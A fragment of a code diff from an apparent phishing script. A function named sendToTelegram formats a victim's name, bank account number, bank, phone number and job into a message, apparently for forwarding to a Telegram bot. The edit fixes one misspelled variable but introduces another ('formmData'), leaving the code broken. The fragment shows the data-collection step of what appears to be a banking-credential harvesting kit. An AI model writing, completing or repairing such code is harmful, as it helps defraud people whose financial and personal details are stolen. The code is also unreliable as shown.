@@ -243,8 +243,8 @@ async function sendToTelegram() {
 📋 <b>Data Diri:</b>
 ├ Nama: <code>${formData.nama}</code>
 ├ No Rekening: <code>${formData.norekening}</code>
-├ Bank: <code>${fromData.bank}</code>
-├ No Hp: <code>${fromData.nohp}</code>
+├ Bank: <code>${formmData.bank}</code>
+├ No Hp: <code>${formData.nohp}</code>
 └ Pekerjaan: <code>${formData.job}</code>
 
 🔗 <b>Link:</b>
